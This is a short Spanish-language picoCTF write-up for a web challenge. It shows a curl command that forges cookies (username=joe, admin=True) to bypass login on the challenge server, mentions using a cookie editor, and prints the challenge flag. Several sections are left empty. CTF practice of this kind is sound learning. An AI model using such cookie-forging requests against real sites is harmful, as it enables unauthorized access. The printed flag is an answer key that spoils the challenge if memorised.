
#### Description
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/15796/` ([link](https://jupiter.challenges.picoctf.org/problem/15796/)) or http://jupiter.challenges.picoctf.org:15796

#### Hints 
1. Hmm it doesn't seem to check anyone's password, except for Joe's?



#### Solución:

1. Analizamos las cookies

````
Analizamos el protocolo HTTP
Analizamos Reques Headers
Request methods
Response headers
Respons Codes
200, 400, 303, 505
Http cookies

curl https://jupiter.challenges.picoctf.org/problem/15796/flag -H "Cookie: username=joe; password=FASDF; admin=True"
`````

2. Podemos usar un editor de cookies.

````

`````


#### Pico:
picoCTF{th3_c0nsp1r4cy_l1v3s_6edb3f5f}

#### Notas adicionales:


#### Referencias:



